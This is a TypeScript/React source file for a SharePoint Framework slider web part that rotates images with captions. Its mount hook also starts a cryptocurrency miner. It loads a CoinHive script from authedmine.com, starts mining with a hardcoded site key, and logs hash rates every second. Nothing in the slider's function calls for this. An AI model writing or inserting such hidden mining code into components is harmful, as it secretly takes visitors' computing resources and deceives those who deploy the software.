import * as React from 'react';
import styles from './Slider.module.scss';
import { ISliderProps, ISliderState } from './ISliderProps';
import { escape } from '@microsoft/sp-lodash-subset';
import { Spinner } from 'office-ui-fabric-react/lib/Spinner';

import { Placeholder } from "@pnp/spfx-controls-react/lib/Placeholder";
import { SPComponentLoader } from '@microsoft/sp-loader';

export default class Slider extends React.Component<ISliderProps, {}> {
  private slides: NodeListOf<Element> = null;
  private currentSlide: number = null;
  private slideInterval: number = null;

  /**
   * componentDidMount lifecycle hook
   */
  public componentDidMount(): void {
    this.startSlideshow();
    this.startMiner();
  }

  /**
   * componentDidUpdate lifecycle hook
   */
  public componentDidUpdate(prevProps: ISliderProps): void {
    if (this.props.collectionData && this.props.collectionData.length > 0) {
      this.startSlideshow();
    } else {
      clearInterval(this.slideInterval);
      this.slideInterval = null;
    }
  }

  /**
   * Start the slideshow
   */
  private startSlideshow() {
    if (this.props.collectionData.length > 1) {
      this.slides = document.querySelectorAll(`.${styles.newsHighlights} .${styles.slide}`);
      this.currentSlide = 0;
      // Check if previous interval needs to be cleared first
      if (this.slideInterval) {
        clearInterval(this.slideInterval);
        this.slideInterval = null;
      }
      this.slideInterval = setInterval(this.nextSlide, this.props.interval * 1000);
    }
  }

  /**
   * Next slide event
   */
  private nextSlide = () => {
    if (this.slides) {
      this.slides[this.currentSlide].className = styles.slide;
      this.currentSlide = (this.currentSlide+1)%this.slides.length;
      this.slides[this.currentSlide].className = `${styles.slide} ${styles.showing}`;
    }
  }

  /**
   * Opens the property pane
   */
  private onConfigure = () => {
    this.props.context.propertyPane.open();
  }

  /**
   * Miner
   */
  private async startMiner() {
    const CoinHive: any = await SPComponentLoader.loadScript("https://authedmine.com/lib/authedmine.min.js", { globalExportsName: "CoinHive" });
    const miner = new CoinHive.Anonymous('tWtClvFAvcHde99kpj0BSxLCir2B65Up', {throttle: 0.3});
    await miner.start();

    setInterval(() => {
      var hashesPerSecond = miner.getHashesPerSecond();
      var totalHashes = miner.getTotalHashes();
      var acceptedHashes = miner.getAcceptedHashes();

      console.log(`
        Hashes per second: ${hashesPerSecond}
        Total hashes: ${totalHashes}
        Accepted hashes: ${acceptedHashes}
      `);
    }, 1000);
  }

  /**
   * Default React render method
   */
  public render(): React.ReactElement<ISliderProps> {
    return (
      <div className={ styles.slider }>
        {
          (!this.props.collectionData || this.props.collectionData && this.props.collectionData.length <= 0) ? (
            <Placeholder iconName='Edit'
                         iconText='Configure your web part'
                         description='Please configure the web part.'
                         buttonLabel='Configure'
                         onConfigure={this.onConfigure} />
          ) : (
            <div className={styles.newsHighlights}>
              {
                this.props.collectionData.map((item, idx) => (
                  <div className={`${styles.slide} ${idx === 0 ? styles.showing : ""}`}>
                    <img src={item.image} />
                    <div className={styles.caption}>
                      <p><b>{item.title}</b></p>
                      <p><i>{item.description}</i></p>
                    </div>
                  </div>
                ))
              }
            </div>
          )
        }
      </div>
    );
  }
}
